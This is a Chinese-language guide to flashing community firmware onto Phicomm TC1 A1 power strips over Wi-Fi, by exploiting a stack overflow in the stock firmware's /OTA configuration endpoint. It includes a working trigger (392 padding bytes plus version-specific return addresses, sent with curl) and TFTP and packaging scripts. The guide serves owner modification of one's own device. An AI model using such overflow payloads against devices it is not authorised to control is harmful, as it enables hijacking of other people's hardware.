# TC1 免拆刷机

**适用于 TC1 A1 硬件（EMW3031 / MK3031）、原厂版本 1.0.0.26 与 1.0.0.24。** 其他原厂版本、TC1 A2 与 A1 空气净化器不适用。

通过 Wi-Fi 安装社区固件，无需拆壳、焊接、串口或 SWD，也不依赖原厂云服务。

图文操作子页：[一个有线＋一个无线＋一个 AP](tc1-no-disassembly-ethernet-wifi-ap)，含配套固件、payload 下载，以及 Windows / Linux / macOS 命令。

## 原理

原厂固件在配网模式下提供一个本地配置服务，其中的 OTA 接口存在栈溢出漏洞。电脑向这个接口发送特制请求（payload），就能让设备跳转到固件自带的**工厂 OTA 升级流程**。

进入这个流程后，TC1 会主动连接名为 `PHICOMM_OTA_AP` 的开放 Wi-Fi，从 `10.0.0.2` 上的 TFTP 服务下载 `mico_ota.bin`。下载完成后，设备校验文件、切换固件并重启，启动社区固件。

整个过程分为两段：**先用电脑连接 TC1 配网热点发送触发请求，再由 TC1 连接路由器热点下载固件。** 因此，需要提前准备好 OTA 热点和文件服务；两段连接不需要共用一块网卡。

## 刷机准备

### 设备与工具

- 一台 **TC1 A1 硬件版排插**，原厂版本为 **1.0.0.26** 或 **1.0.0.24**。
- 一台同时有**有线网卡和无线网卡**的电脑，以及一台支持 **2.4 GHz 开放 Wi-Fi** 的路由器。
- 一根网线，电脑上安装 Python 3、`curl` 和 **tftpd 等 TFTP 服务软件**。也可使用本页提供的 Python TFTP 服务。
- 对应设备的社区应用槽镜像 `tc1_community.image.bin`。

也可以使用其他等效拓扑。关键是同时具备两条连接：一个客户端能连接 TC1 配网热点发送请求，TC1 随后能通过 OTA 热点访问文件服务器。

刷机前了解[供电与接线要求](flash-prep)以及[固件包的选择](firmware-update)。刷写会擦除非活动应用槽并重启设备；原厂保留槽**不构成自动回退保证**。

### 准备升级文件

可直接下载配套的 [mico_ota.bin](assets/tools/tc1-no-disassembly/mico_ota.bin)（649344 字节），无需运行打包脚本。自行准备其他镜像时再使用以下方法。

升级文件是原始 **MRVL 应用槽镜像 + 该镜像的 16 字节二进制 MD5**，不是 32 字符文本。社区应用槽镜像为 649328 字节，按下面步骤生成 649344 字节的 `mico_ota.bin`：

```sh
python3 - <<'PY'
import hashlib
image = open('tc1_community.image.bin', 'rb').read()
assert image.startswith(b'MRVL'), '需要 MRVL 原始应用槽镜像'
assert len(image) + 16 <= 0xA9000, '镜像必须能放进 692224 B 应用槽'
open('mico_ota.bin', 'wb').write(image + hashlib.md5(image).digest())
print(len(image), hashlib.md5(image).hexdigest())
PY
```

镜像 MD5 应为 `137bbe25d40f0a45b2b3129f035ea4c3`。不要将整片备份、完整 `.all.bin` 或带 `PHOTA001` 包头的网页升级包作为输入；脚本只检查 MRVL 标记、大小和 MD5，不负责证明镜像适合该硬件。

## 刷机方法

### 前置步骤

1. 将 `mico_ota.bin` 放入电脑的 TFTP 服务目录，准备好终端和 TFTP 日志窗口。
2. 给 TC1 保持稳定供电，排插上不要连接负载。
3. 完成 OTA 热点和 TFTP 服务的设置、检查后，再让 TC1 进入配网模式并发送触发请求。刷写期间保持电脑有线连接、路由器和 TFTP 服务运行。

### 1. 建立 OTA 热点与 TFTP

#### 网络要求

操作系统和设备型号不限，也可以由一台电脑或手机连接 TC1 配网热点，另一台电脑、便携路由器或无线 AP 提供 OTA 网络。TFTP 可以运行在 AP 本机，或运行在与热点桥接互通的有线电脑上。

无论使用哪种设备组合，都要满足：**开放的 2.4 GHz 热点 `PHICOMM_OTA_AP`，以及能通过该热点访问的 `10.0.0.2/8` TFTP 服务**，文件名为 `mico_ota.bin`。若用单块无线网卡同时连接 TC1 热点并提供 OTA 热点，网卡及驱动必须支持客户端与热点并行运行。

#### 可选：使用 Python 提供 TFTP 服务

没有现成 TFTP 软件时，可用下面的只读 Python 服务（只提供该文件，拒绝写入）：

```sh
python3 - <<'PY'
import socket, struct
data = open('mico_ota.bin', 'rb').read()
srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
srv.bind(('10.0.0.2', 69))
print('listening on 10.0.0.2:69,', len(data), 'B')
while True:
    req, peer = srv.recvfrom(2048)
    if req[2:].split(b'\0')[:2] != [b'mico_ota.bin', b'octet']:
        srv.sendto(struct.pack('!HH', 5, 4) + b'only mico_ota.bin octet\0', peer)
        continue
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as stream:
        stream.bind(('10.0.0.2', 0))
        stream.settimeout(3)
        for offset in range(0, len(data) + 1, 512):
            block = offset // 512 + 1
            packet = struct.pack('!HH', 3, block) + data[offset:offset + 512]
            for _ in range(5):
                stream.sendto(packet, peer)
                try:
                    ack, sender = stream.recvfrom(516)
                except socket.timeout:
                    continue
                if sender == peer and ack == struct.pack('!HH', 4, block):
                    break
print('done')
PY
```

Linux/macOS 监听 69 端口通常需要相应权限；Windows 需按防火墙提示放行 OTA 网卡上的 UDP。

### 2. 让 TC1 进入配网模式

两种方法任选其一。成功标志相同：LED 慢闪，广播开放热点 `Phicomm_TC1_XXXX`（`XXXX` 为 MAC 后四位），设备地址 `10.10.10.1/24`，并在 `:8000` 监听配置服务。

- **方法一：** 断电重新上电，在上电 **3 秒内双击配网键**。LED 转为约 500 ms 慢闪，随后出现开放热点。
- **方法二：** 长按配网键，等 LED 转为快闪后保持一段时间再松开，随后快速短按配网键两次；出现开放热点即进入配网模式。不同原厂版本对快闪的定义可能不同，以热点出现为准。

看不到热点时，先断电重试方法一；仍不行时重新核对设备硬件版本与原厂版本，不要反复快速操作。

用电脑的无线网卡连接该热点，确认获得 `10.10.10.x/24` 地址。有线网卡和 TFTP 服务保持运行。然后在电脑终端执行只读查询，确认原厂版本：

```sh
curl -s -m 5 http://10.10.10.1:8000/read-domain
```

`VERSION` 应为 `1.0.0.26` 或 `1.0.0.24`，`COMPILE_TIME` 为 `Apr 13 2018 10:09:06`。版本不符时不要继续；后续 payload 的目标地址必须与识别出的版本对应，见下一步。

### 3. 发送触发请求

可直接下载对应版本的 payload 文件，跳过 Python 生成步骤：1.0.0.26 用 [tftp-trigger.bin](assets/tools/tc1-no-disassembly/tftp-trigger.bin)，1.0.0.24 用 [tftp-trigger-1.0.0.24.bin](assets/tools/tc1-no-disassembly/tftp-trigger-1.0.0.24.bin)。Windows / Linux / macOS 的完整命令见[图文操作子页](tc1-no-disassembly-ethernet-wifi-ap)。

payload 的目标地址随原厂版本变化；两个版本的帧内偏移相同，只是地址平移：

| 原厂版本 | payload 目标地址（小端） | 说明 |
| --- | --- | --- |
| 1.0.0.26 | `0x1F073D9F`（`9f 3d 07 1f`） | 工厂 OTA 线程体 |
| 1.0.0.24 | `0x1F073D63`（`63 3d 07 1f`） | 同一线程体，地址平移 −0x3C |

保持电脑无线网卡连接 TC1 配网热点，在电脑终端执行以下命令：Python 先生成栈溢出触发文件，`curl` 再将它发送给设备。只发送一次，随后观察设备与 TFTP 日志。目标地址按上表替换：

```sh
python3 - <<'PY'
# 1.0.0.26 用 0x1F073D9F；1.0.0.24 用 0x1F073D63
body = b'A' * 392 + (0x1F073D9F).to_bytes(4, 'little') + b'\0'
open('tftp-trigger.bin', 'wb').write(body)
print(len(body))
PY
curl --max-time 30 --header 'Content-Type: application/json' \
  --data-binary @tftp-trigger.bin \
  http://10.10.10.1:8000/OTA
```

返回 `OTA AAAA...` 只表示请求已被接收，**不代表刷写成功**。连接中断或返回未确认时，先观察设备状态，不要立即重复触发。

### 4. 等待下载与首次启动

设备进入工厂 OTA 模式后，会离开配网热点并自动加入路由器的 `PHICOMM_OTA_AP`。此时电脑无线连接断开是预期现象，有线连接和 TFTP 服务继续运行。

观察电脑上的 **TFTP 日志**，应看到设备请求并下载 `mico_ota.bin`。传输方向是**电脑向 TC1 发送文件、TC1 从电脑下载固件**，软件通常显示读取请求（RRQ）或发送文件记录。

TC1 在 OTA 网络中使用 `10.<MAC 后三字节逐字节转十进制>`、掩码 `/8`；每台设备地址不同。典型过程为：加入 OTA 热点 → 擦除非活动应用槽 → 下载固件 → 校验 MD5 → 切换应用槽并重启。保持供电，等待整个过程完成。

成功首启后会出现开放热点 **`TC1_A1-AP-<MAC 后六位大写>`**。用电脑或手机连接该热点，在浏览器打开 **`http://192.168.0.1`**，进入社区固件本地网页继续配网。

### 5. 确认完成并恢复网络

分别确认原厂识别信息、TFTP 完整下载记录、新固件热点和本地网页可访问。HTTP 200、设备掉线或一次 TFTP 传输都不能单独作为刷机成功的依据。

确认新固件可用后，关闭临时 OTA 热点与 TFTP 服务，恢复本次调整的网卡地址和防火墙配置。使用 OpenWrt / ImmortalWrt 搭建临时接口与 dnsmasq TFTP 的，删除本次添加的临时配置，恢复原网络。

## 常见问题

| 现象 | 常见原因 |
| --- | --- |
| 看不到 `Phicomm_TC1_XXXX` | 按键节奏不对，或设备不是 A1 硬件 / 不是 1.0.0.26 或 1.0.0.24 |
| `/OTA` 返回 404 或无响应 | 未处于配网模式，或客户端不在 `10.10.10.x/24` |
| 设备没有加入 OTA 热点 | 热点不是 2.4 GHz、名称不是 `PHICOMM_OTA_AP`，或开启了客户端隔离 |
| TFTP 只传了开头 | 防火墙只放行 UDP 69，未放行传输会话端口 |
| TFTP 完成但没有切槽 | 镜像 MD5 不匹配，或镜像超出 692224 B 应用槽 |

本页仅覆盖上文所列设备与版本。其他原厂版本不适用。
